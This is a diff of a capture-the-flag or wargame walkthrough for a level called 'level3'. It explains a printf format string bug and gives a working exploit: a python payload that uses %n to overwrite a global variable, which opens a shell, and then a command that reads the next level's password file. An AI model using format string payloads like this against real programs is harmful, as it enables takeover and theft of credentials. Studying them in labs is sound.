@@ -1,5 +1,16 @@
+in this level, the program get input with fgets (which does not have buffer overflow issues)
+and then we use printfs to print directly the user input which can be exploitable
+after that the program check the value of a global variable, if it equals 64 the program open the shell
+
+we can use printf to change the value of the global variable, all what we need is to find the address of this variable in the stack and make printf ;odify it using %need
+in gdb we run :
+run <<< $(python -c "print '\x8c\x98\x04\x08 %x %x %x %x %x %x'")
+where \x8c\x98\x04\x08 is the address of the variable
+it seems that the variable appears in the 4th argument
+then we make printf print 64 character and then use %n to set the variable to 64
+
 python -c "print '\x8c\x98\x04\x08'+'A'*60+'%4\$n'" > /tmp/level3
-cat /tmp/level3 - | ./level3
+~$ cat /tmp/level3 - | ./level3
 �AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 Wait what?!
 cat /home/user/level4/.pass
